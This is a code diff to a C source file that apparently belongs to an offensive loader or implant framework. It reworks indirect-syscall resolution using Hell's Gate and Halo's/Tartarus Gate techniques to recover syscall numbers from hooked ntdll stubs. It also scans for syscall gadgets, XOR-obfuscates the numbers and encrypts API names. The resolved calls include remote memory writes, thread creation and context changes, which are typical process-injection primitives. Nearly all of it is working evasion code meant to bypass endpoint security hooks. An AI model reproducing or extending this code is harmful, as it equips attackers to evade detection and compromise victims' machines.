@@ -3,20 +3,57 @@
  *
  * Tries PEB walk for indirect syscalls. If it fails, falls back
  * to standard kernel32.dll / ntdll.dll imports.
+ *
+ * Resolution is table-driven (g_syscalls) and fail-closed: every entry
+ * must resolve to a non-zero SSN via direct stub read (Hell's Gate) or
+ * the Halo neighbor walk (Tartarus Gate); otherwise mirage_syscall_resolve()
+ * returns 0 and the whole engine stays in WinAPI fallback mode. obf()
+ * never XORs a zero slot — the historical bug that made stubs issue
+ * syscall #0.
  */
 #include "engine.h"
 #include "hash.h"
 #include "peb.h"
 #include "export_resolve.h"
 #include "config.h"
+#ifndef ZIALFI_TEST_MODE
 #include "mirage_asm.h"
-#include "enc_strings.h"
 #include "stack_spoof.h"
+#else
+/* Host-test seam: skip asm/spoof declarations — inert definitions are
+ * provided below so the gcc host build links without NASM objects. */
+#include <stdint.h>
+extern uint32_t ssn_NtAllocateVirtualMemory, ssn_NtProtectVirtualMemory,
+       ssn_NtFreeVirtualMemory, ssn_NtWriteVirtualMemory, ssn_NtClose,
+       ssn_NtOpenFile, ssn_NtReadVirtualMemory, ssn_NtCreateSection,
+       ssn_NtMapViewOfSection, ssn_NtQueryInformationProcess,
+       ssn_NtCreateFile, ssn_NtWriteFile, ssn_NtQuerySystemInformation,
+       ssn_NtDelayExecution, ssn_NtCreateEvent, ssn_NtWaitForSingleObject,
+       ssn_NtOpenKey, ssn_NtQueryValueKey, ssn_NtSetInformationProcess,
+       ssn_NtSetInformationFile, ssn_NtGetContextThread,
+       ssn_NtSetContextThread, ssn_NtOpenSection, ssn_NtUnmapViewOfSection,
+       ssn_NtCreateThreadEx, ssn_NtOpenProcess, ssn_NtResumeThread,
+       ssn_NtSuspendThread, ssn_NtDeleteFile, ssn_NtFlushInstructionCache;
+extern uintptr_t gadget_pool[64];
+void *getPeb(void);
+#endif
+#include "enc_strings.h"
 #include <stddef.h>
 #include <windows.h>
 
 /* ── State ────────────────────────────────────────────────────── */
 static int g_use_fallback = 1;
+
+/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
+uint32_t ssn_xor_key = 0xA3B5C7D9;
+
+/* ═══════ Per-entry indirect gadgets (0F 05 within stub+0x22) ═══ */
+static uintptr_t g_gadgets[30];
+
+uintptr_t mirage_syscall_gadget(uint32_t index) {
+    if (index >= 30) return 0;
+    return g_gadgets[index];
+}
 
 /* ── PEB-based resolution ─────────────────────────────────────── */
 
@@ -32,15 +69,24 @@ static int hooked(const uint8_t* s) {
     return 0;
 }
 
-static uint32_t xssn(const uint8_t* s) {
-    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8)
-        return r32le(s+4);
-    for (uint32_t i=0; i<12; i++)
-        if (s[i]==0xB8 && (i+4)<=0x20) {
-            uint32_t c=r32le(s+i+1);
-            if (c < 0x500) return c;
-        }
-    return 0;
+/*
+ * Strict stub match (zcircuit isCleanStub / sysplant isClean):
+ *   4C 8B D1        mov r10, rcx
+ *   B8 xx xx 00 00  mov eax, <SSN>  (imm32 zero-extended, < 0x1000)
+ * The imm32 upper bound rejects poison/medium stubs (e.g. wow64 trampolines
+ * carrying large immediates) that the old loose window check accepted.
+ */
+static int is_clean_stub(const uint8_t* p) {
+    if (p[0]!=0x4C || p[1]!=0x8B || p[2]!=0xD1 || p[3]!=0xB8)
+        return 0;
+    if (p[6]!=0x00 || p[7]!=0x00)
+        return 0;
+    uint32_t imm = r32le(p+4);
+    return imm != 0 && imm < 0x1000;
+}
+
+static uint32_t extract_ssn(const uint8_t* p) {
+    return r32le(p+4);
 }
 
 typedef struct { uintptr_t s; uintptr_t e; } TB;
@@ -57,7 +103,8 @@ static int tbounds(void* base, TB* o) {
     PIMAGE_SECTION_HEADER sc=(PIMAGE_SECTION_HEADER)(bp+so);
     for (uint16_t i=0; i<nt->FileHeader.NumberOfSections; i++) {
         if (sc[i].Name[0]=='.' && sc[i].Name[1]=='t' &&
-            sc[i].Name[2]=='e' && sc[i].Name[3]=='x' && sc[i].Name[4]=='t') {
+            sc[i].Name[2]=='e' && sc[i].Name[3]=='x' &&
+            sc[i].Name[4]=='t') {
             o->s=(uintptr_t)bp+sc[i].VirtualAddress;
             o->e=o->s+sc[i].Misc.VirtualSize;
             return 1;
@@ -66,108 +113,116 @@ static int tbounds(void* base, TB* o) {
     return 0;
 }
 
-static uint32_t rsn(void* ntdll, uint32_t hash) {
-    void* fp=mirage_get_function_by_hash(ntdll, hash);
-    if (!fp) return 0;
-    const uint8_t* st=(const uint8_t*)fp;
-    if (!hooked(st)) return xssn(st);
-    TB b;
-    if (!tbounds(ntdll, &b)) return 0;
-    uintptr_t sa=(uintptr_t)st;
-    static const uintptr_t st2[]={0x20,0x28,0x30};
-    for (uintptr_t d=1; d<=8; d++) {
-        for (uint32_t s=0; s<3; s++) {
-            uintptr_t o=d*st2[s];
-            uintptr_t fw=sa+o;
-            if (fw+0x20<=b.e) {
-                const uint8_t* fs=(const uint8_t*)fw;
-                if (!hooked(fs)) {
-                    uint32_t ns=xssn(fs);
-                    if (ns) return ns-(uint32_t)d;
-                }
-            }
-            if (o<=(sa-b.s)) {
-                uintptr_t bw=sa-o;
-                if (bw>=b.s && bw+0x20<=b.e) {
-                    const uint8_t* bs=(const uint8_t*)bw;
-                    if (!hooked(bs)) {
-                        uint32_t ns=xssn(bs);
-                        if (ns) return ns+(uint32_t)d;
-                    }
-                }
-            }
-        }
-    }
-    return 0;
-}
+/* ── Halo's Gate / Tartarus Gate fallback ─────────────────────── */
 
-static int r1(void* base, uint32_t h, uint32_t* o) {
-    uint32_t s=rsn(base, h);
-    if (s) { *o=s; return 1; }
-    return 0;
-}
-
-/* ── Halo's Gate fallback ──────────────────────────────────────── */
+#define HALO_MAX_DISTANCE 200   /* bounded neighbor walk (ponytail: was unbounded in refs) */
 
 static uint32_t resolve_ssn_halo(void* ntdll_base, uint32_t target_hash) {
     void* func = mirage_get_function_by_hash(ntdll_base, target_hash);
     if (!func) return 0;
 
     uint8_t* bytes = (uint8_t*)func;
-    if (bytes[0] == 0xE9 || bytes[0] == 0xFF) return 0;
-
-    uint32_t ssn = xssn(bytes);
-    if (ssn && ssn < 0x500) return ssn;
+    if (is_clean_stub(bytes))
+        return extract_ssn(bytes);
 
     TB b;
     if (!tbounds(ntdll_base, &b)) return 0;
 
-    for (int dir = -1; dir <= 1; dir += 2) {
-        for (uintptr_t offset = 0x20; offset < 0x200; offset += 0x20) {
-            uintptr_t addr = (uintptr_t)((intptr_t)func + (intptr_t)dir * (intptr_t)offset);
-            if (addr < b.s || addr + 8 >= b.e) continue;
-            uint8_t* probe = (uint8_t*)addr;
-            if (probe[0]==0x4C && probe[1]==0x8B && probe[2]==0xD1 && probe[3]==0xB8) {
-                uint32_t candidate = r32le(probe+4);
-                if (candidate > 0x1000 && candidate < 0x2000) {
-                    if (ssn) {
-                        int64_t diff = (int64_t)candidate - (int64_t)ssn;
-                        if (diff > 0 && diff < 50) return candidate;
-                    } else {
-                        return candidate;
-                    }
-                }
+    uintptr_t sa = (uintptr_t)func;
+    for (uintptr_t d = 1; d <= HALO_MAX_DISTANCE; d++) {
+        /* forward neighbor: ssn = neighbor - d */
+        uintptr_t fw = sa + d*0x20;
+        if (fw+8 < b.e) {
+            const uint8_t* fs = (const uint8_t*)fw;
+            if (is_clean_stub(fs))
+                return extract_ssn(fs) - (uint32_t)d;
+        }
+        /* backward neighbor: ssn = neighbor + d
+         * guard unsigned underflow: fw - sa must be inside the section */
+        if ((sa - b.s) >= d*0x20) {
+            uintptr_t bw = sa - d*0x20;
+            if (bw+8 < b.e) {
+                const uint8_t* bs = (const uint8_t*)bw;
+                if (is_clean_stub(bs))
+                    return extract_ssn(bs) + (uint32_t)d;
             }
         }
     }
     return 0;
 }
 
+/* ── Resolution table ─────────────────────────────────────────── */
+
+typedef struct {
+    const uint8_t *name_enc;   /* enc_* array from enc_strings.h */
+    size_t         name_len;
+    uint32_t      *ssn_slot;   /* ssn_NtX global shared with asm stubs */
+} syscall_entry_t;
+
+/* 30 ntdll syscalls, EXCLUDING NtUserGetSystemMetrics (win32u.dll —
+ * unresolvable from ntdll; wrapper falls back to user32 unconditionally).
+ * Index order is public: mirage_syscall_gadget(index). */
+static const syscall_entry_t g_syscalls[] = {
+    { enc_NtAllocateVirtualMemory,     ENC_NTALLOCATEVIRTUALMEMORY_LEN,     &ssn_NtAllocateVirtualMemory },
+    { enc_NtProtectVirtualMemory,      ENC_NTPROTECTVIRTUALMEMORY_LEN,      &ssn_NtProtectVirtualMemory },
+    { enc_NtFreeVirtualMemory,         ENC_NTFREEVIRTUALMEMORY_LEN,         &ssn_NtFreeVirtualMemory },
+    { enc_NtWriteVirtualMemory,        ENC_NTWRITEVIRTUALMEMORY_LEN,        &ssn_NtWriteVirtualMemory },
+    { enc_NtClose,                     ENC_NTCLOSE_LEN,                     &ssn_NtClose },
+    { enc_NtOpenFile,                  ENC_NTOPENFILE_LEN,                  &ssn_NtOpenFile },
+    { enc_NtReadVirtualMemory,         ENC_NTREADVIRTUALMEMORY_LEN,         &ssn_NtReadVirtualMemory },
+    { enc_NtCreateSection,             ENC_NTCREATESECTION_LEN,             &ssn_NtCreateSection },
+    { enc_NtMapViewOfSection,          ENC_NTMAPVIEWOFSECTION_LEN,          &ssn_NtMapViewOfSection },
+    { enc_NtQueryInformationProcess,   ENC_NTQUERYINFORMATIONPROCESS_LEN,   &ssn_NtQueryInformationProcess },
+    { enc_NtCreateFile,                ENC_NTCREATEFILE_LEN,                &ssn_NtCreateFile },
+    { enc_NtWriteFile,                 ENC_NTWRITEFILE_LEN,                 &ssn_NtWriteFile },
+    { enc_NtQuerySystemInformation,    ENC_NTQUERYSYSTEMINFORMATION_LEN,    &ssn_NtQuerySystemInformation },
+    { enc_NtDelayExecution,            ENC_NTDELAYEXECUTION_LEN,            &ssn_NtDelayExecution },
+    { enc_NtCreateEvent,               ENC_NTCREATEEVENT_LEN,               &ssn_NtCreateEvent },
+    { enc_NtWaitForSingleObject,       ENC_NTWAITFORSINGLEOBJECT_LEN,       &ssn_NtWaitForSingleObject },
+    { enc_NtOpenKey,                   ENC_NTOPENKEY_LEN,                   &ssn_NtOpenKey },
+    { enc_NtQueryValueKey,             ENC_NTQUERYVALUEKEY_LEN,             &ssn_NtQueryValueKey },
+    { enc_NtSetInformationProcess,     ENC_NTSETINFORMATIONPROCESS_LEN,     &ssn_NtSetInformationProcess },
+    { enc_NtSetInformationFile,        ENC_NTSETINFORMATIONFILE_LEN,        &ssn_NtSetInformationFile },
+    { enc_NtGetContextThread,          ENC_NTGETCONTEXTTHREAD_LEN,          &ssn_NtGetContextThread },
+    { enc_NtSetContextThread,          ENC_NTSETCONTEXTTHREAD_LEN,          &ssn_NtSetContextThread },
+    { enc_NtOpenSection,               ENC_NTOPENSECTION_LEN,               &ssn_NtOpenSection },
+    { enc_NtUnmapViewOfSection,        ENC_NTUNMAPVIEWOFSECTION_LEN,        &ssn_NtUnmapViewOfSection },
+    { enc_NtCreateThreadEx,            ENC_NTCREATETHREADEX_LEN,            &ssn_NtCreateThreadEx },
+    { enc_NtOpenProcess,               ENC_NTOPENPROCESS_LEN,               &ssn_NtOpenProcess },
+    { enc_NtResumeThread,              ENC_NTRESUMETHREAD_LEN,              &ssn_NtResumeThread },
+    { enc_NtSuspendThread,             ENC_NTSUSPENDTHREAD_LEN,             &ssn_NtSuspendThread },
+    { enc_NtDeleteFile,                ENC_NTDELETEFILE_LEN,                &ssn_NtDeleteFile },
+    { enc_NtFlushInstructionCache,     ENC_NTFLUSHINSTRUCTIONCACHE_LEN,     &ssn_NtFlushInstructionCache },
+};
+
+#define SYSCALL_COUNT (sizeof(g_syscalls) / sizeof(g_syscalls[0]))
+
 static void obf(void) {
-    uint32_t* p[] = {
-        &ssn_NtAllocateVirtualMemory, &ssn_NtProtectVirtualMemory,
-        &ssn_NtFreeVirtualMemory, &ssn_NtWriteVirtualMemory,
-        &ssn_NtClose, &ssn_NtOpenFile, &ssn_NtReadVirtualMemory,
-        &ssn_NtCreateSection, &ssn_NtMapViewOfSection,
-        &ssn_NtQueryInformationProcess, &ssn_NtCreateFile,
-        &ssn_NtWriteFile, &ssn_NtQuerySystemInformation,
-        &ssn_NtDelayExecution, &ssn_NtCreateEvent,
-        &ssn_NtWaitForSingleObject, &ssn_NtOpenKey,
-        &ssn_NtQueryValueKey, &ssn_NtSetInformationProcess,
-        &ssn_NtSetInformationFile, &ssn_NtGetContextThread,
-        &ssn_NtSetContextThread, &ssn_NtOpenSection,
-        &ssn_NtUnmapViewOfSection, &ssn_NtCreateThreadEx,
-        &ssn_NtOpenProcess, &ssn_NtResumeThread,
-        &ssn_NtSuspendThread, &ssn_NtDeleteFile,
-        &ssn_NtFlushInstructionCache, &ssn_NtUserGetSystemMetrics,
-    };
-    for (uint32_t i=0; i<sizeof(p)/sizeof(p[0]); i++)
-        *p[i] ^= ssn_xor_key;
+    /* XOR-deobfuscate resolved SSNs in place for the asm stubs.
+     * Zero entries stay zero — XORing 0 would fabricate ssn_xor_key as
+     * the syscall number (the historical "issue syscall #0" bug). */
+    for (size_t i = 0; i < SYSCALL_COUNT; i++) {
+        uint32_t* p = g_syscalls[i].ssn_slot;
+        if (*p != 0)
+            *p ^= ssn_xor_key;
+    }
 }
 
+/* Scan forward <= 0x22 bytes from a clean stub for a 0F 05 (syscall)
+ * sequence — Hell's Hall gadget for later indirect execution. */
+static uintptr_t scan_gadget(const uint8_t* stub, const TB* b) {
+    uintptr_t a = (uintptr_t)stub;
+    for (size_t k = 0; k <= 0x22; k++) {
+        uintptr_t g = a + k;
+        if (g + 1 >= b->e) break;
+        const uint8_t* p = (const uint8_t*)g;
+        if (p[0] == 0x0F && p[1] == 0x05)
+            return g;
+    }
+    return 0;
+}
 
-
-/* --- .mi_cfg section reader ------------------------------------ */
+/* ── .mi_cfg section reader ------------------------------------ */
 typedef struct {
     uint32_t seed;
     uint8_t  string_key[16];
@@ -199,7 +254,7 @@ int mi_cfg_load(void) {
         if (memcmp(sec[i].Name, ".mi_cfg", 7) == 0) {
             uint8_t *data = (uint8_t *)base + sec[i].VirtualAddress;
             memcpy(&g_mi_cfg.seed, data, 4);
-            memcpy(g_mi_cfg.string_key, data + 4, 16);
+            memcpy(&g_mi_cfg.string_key, data + 4, 16);
             memcpy(&g_mi_cfg.ssn_xor_key, data + 20, 4);
             return 1;
         }
@@ -220,108 +275,66 @@ int mirage_syscall_resolve(void) {
     if (!ntdll) { g_use_fallback = 1; return 0; }
     mirage_init_native_resolver(ntdll);
 
-    uint32_t hash;
+    TB b;
+    int have_bounds = tbounds(ntdll, &b);
+    int all_resolved = 1;
+    uint32_t unresolved = 0;
+
     char fn_buf[32];
+    for (size_t i = 0; i < SYSCALL_COUNT; i++) {
+        const syscall_entry_t* e = &g_syscalls[i];
+        *e->ssn_slot = 0;
 
-    enc_decrypt(enc_NtAllocateVirtualMemory, ENC_NTALLOCATEVIRTUALMEMORY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtAllocateVirtualMemory))
-        ssn_NtAllocateVirtualMemory = resolve_ssn_halo(ntdll, hash);
+        enc_decrypt(e->name_enc, e->name_len, fn_buf);
+        uint32_t hash = mirage_encrypted_hash_func(fn_buf);
+        uint32_t ssn = resolve_ssn_halo(ntdll, hash);
+        if (ssn != 0 && ssn < 0x1000)
+            *e->ssn_slot = ssn;
+        else {
+            all_resolved = 0;
+            unresolved++;
+            continue;
+        }
 
-    enc_decrypt(enc_NtProtectVirtualMemory, ENC_NTPROTECTVIRTUALMEMORY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtProtectVirtualMemory))
-        ssn_NtProtectVirtualMemory = resolve_ssn_halo(ntdll, hash);
+        /* gadget scan: forward <= 0x22 from the stub itself; hooked or
+         * poisoned stubs borrow the nearest clean neighbor's gadget —
+         * every 0F 05 in the syscall region is interchangeable. */
+        if (have_bounds) {
+            void* fp = mirage_get_function_by_hash(ntdll, hash);
+            if (fp) {
+                const uint8_t* stub = (const uint8_t*)fp;
+                if (is_clean_stub(stub)) {
+                    g_gadgets[i] = scan_gadget(stub, &b);
+                } else {
+                    uintptr_t sa = (uintptr_t)stub;
+                    for (uintptr_t d = 1; d <= HALO_MAX_DISTANCE; d++) {
+                        uintptr_t fw = sa + d*0x20;
+                        if (fw+8 >= b.e) break;
+                        if (is_clean_stub((const uint8_t*)fw)) {
+                            g_gadgets[i] = scan_gadget((const uint8_t*)fw, &b);
+                            break;
+                        }
+                        if (sa >= b.s + d*0x20) {
+                            uintptr_t bw = sa - d*0x20;
+                            if (is_clean_stub((const uint8_t*)bw)) {
+                                g_gadgets[i] = scan_gadget((const uint8_t*)bw, &b);
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
 
-    enc_decrypt(enc_NtFreeVirtualMemory, ENC_NTFREEVIRTUALMEMORY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtFreeVirtualMemory))
-        ssn_NtFreeVirtualMemory = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtWriteVirtualMemory, ENC_NTWRITEVIRTUALMEMORY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtWriteVirtualMemory))
-        ssn_NtWriteVirtualMemory = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtClose))
-        ssn_NtClose = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtOpenFile, ENC_NTOPENFILE_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtOpenFile))
-        ssn_NtOpenFile = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtReadVirtualMemory, ENC_NTREADVIRTUALMEMORY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtReadVirtualMemory))
-        ssn_NtReadVirtualMemory = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtCreateSection))
-        ssn_NtCreateSection = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtMapViewOfSection))
-        ssn_NtMapViewOfSection = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtQueryInformationProcess))
-        ssn_NtQueryInformationProcess = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtCreateFile, ENC_NTCREATEFILE_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtCreateFile))
-        ssn_NtCreateFile = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtWriteFile, ENC_NTWRITEFILE_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtWriteFile))
-        ssn_NtWriteFile = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtQuerySystemInformation))
-        ssn_NtQuerySystemInformation = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtDelayExecution, ENC_NTDELAYEXECUTION_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtDelayExecution))
-        ssn_NtDelayExecution = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtOpenKey, ENC_NTOPENKEY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtOpenKey))
-        ssn_NtOpenKey = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtQueryValueKey, ENC_NTQUERYVALUEKEY_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtQueryValueKey))
-        ssn_NtQueryValueKey = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtSetInformationProcess, ENC_NTSETINFORMATIONPROCESS_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtSetInformationProcess))
-        ssn_NtSetInformationProcess = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtCreateThreadEx, ENC_NTCREATETHREADEX_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtCreateThreadEx))
-        ssn_NtCreateThreadEx = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtOpenProcess, ENC_NTOPENPROCESS_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtOpenProcess))
-        ssn_NtOpenProcess = resolve_ssn_halo(ntdll, hash);
-
-    enc_decrypt(enc_NtFlushInstructionCache, ENC_NTFLUSHINSTRUCTIONCACHE_LEN, fn_buf);
-    hash = mirage_encrypted_hash_func(fn_buf);
-    if (!r1(ntdll, hash, &ssn_NtFlushInstructionCache))
-        ssn_NtFlushInstructionCache = resolve_ssn_halo(ntdll, hash);
+    /* Fail-closed: any unresolved entry → whole engine stays in
+     * WinAPI fallback. Never dispatch a stub with a zero SSN. */
+    if (!all_resolved) {
+        obf();  /* zero-guarded: only non-zero slots get XORed */
+        g_use_fallback = 1;
+        (void)unresolved;
+        return 0;
+    }
 
     obf();
     g_use_fallback = 0;
@@ -347,9 +360,6 @@ int mirage_init_gadget_pool(void) {
         gadget_pool[i] = gadget_pool[i % c];
     return 1;
 }
-
-/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
-uint32_t ssn_xor_key = 0xA3B5C7D9;
 
 /* ═══════ XOR-obfuscated export names ══════════════════════════ */
 
@@ -379,6 +389,25 @@ static void deobf_str(const unsigned char *obf, size_t len, char *out) {
         out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
     out[len] = '\0';
 }
+
+#ifdef ZIALFI_TEST_MODE
+/* Host-test seam: the ssn_* globals live in the NASM .data section on the
+ * real build; define them here for the gcc host build. */
+uint32_t ssn_NtAllocateVirtualMemory, ssn_NtProtectVirtualMemory,
+         ssn_NtFreeVirtualMemory, ssn_NtWriteVirtualMemory, ssn_NtClose,
+         ssn_NtOpenFile, ssn_NtReadVirtualMemory, ssn_NtCreateSection,
+         ssn_NtMapViewOfSection, ssn_NtQueryInformationProcess,
+         ssn_NtCreateFile, ssn_NtWriteFile, ssn_NtQuerySystemInformation,
+         ssn_NtDelayExecution, ssn_NtCreateEvent, ssn_NtWaitForSingleObject,
+         ssn_NtOpenKey, ssn_NtQueryValueKey, ssn_NtSetInformationProcess,
+         ssn_NtSetInformationFile, ssn_NtGetContextThread,
+         ssn_NtSetContextThread, ssn_NtOpenSection, ssn_NtUnmapViewOfSection,
+         ssn_NtSuspendThread, ssn_NtDeleteFile, ssn_NtFlushInstructionCache,
+         ssn_NtCreateThreadEx, ssn_NtOpenProcess, ssn_NtResumeThread;
+uintptr_t gadget_pool[64];
+void *getPeb(void) { return 0; }
+#endif
+#ifndef ZIALFI_TEST_MODE
 
 #define RESOLVE_EXPORT_OBF(arr) resolve_export_obf(arr, sizeof(arr))
 
@@ -689,10 +718,9 @@ NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG 
 }
 
 LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) {
-    if (!g_use_fallback) {
-        return (LONG)(uint32_t)NtUserGetSystemMetrics_stub(nIndex);
-    }
-    /* Fallback: resolve GetSystemMetrics via PEB-walk */
+    /* Unconditional user32 GetSystemMetrics fallback — NtUserGetSystemMetrics
+     * is a win32u.dll syscall, unresolvable from ntdll, so the stub and its
+     * SSN slot were removed. */
     typedef int (WINAPI *pGetSystemMetrics)(int);
     static pGetSystemMetrics pGSM = NULL;
     if (!pGSM) {
@@ -707,3 +735,30 @@ LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) {
     }
     return pGSM ? (LONG)(uint32_t)pGSM(nIndex) : 0;
 }
+#else /* ZIALFI_TEST_MODE: wrappers not under test here */
+/* The public wrappers exist for link completeness; the resolution tests
+ * never call them, so they degenerate to the fallback path (NULL export
+ * → -1), which requires no asm or PEB access. */
+NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
+NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return -1; }
+NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+NTSTATUS mirage_NtClose(HANDLE a) { (void)a; return -1; }
+NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) { (void)a;(void)b;(void)c;(void)d; return -1; }
+NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) { (void)a;(void)b; return -1; }
+NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return -1; }
+NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
+NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i; return -1; }
+NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return -1; }
+NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) { (void)a;(void)b;(void)c; return -1; }
+NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
+NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) { (void)a;(void)b;(void)c;(void)d; return -1; }
+NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return -1; }
+NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) { (void)a;(void)b;(void)c; return -1; }
+NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+NTSTATUS mirage_NtDeleteFile(PVOID a) { (void)a; return -1; }
+NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
+LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) { (void)nIndex; return 0; }
+#endif
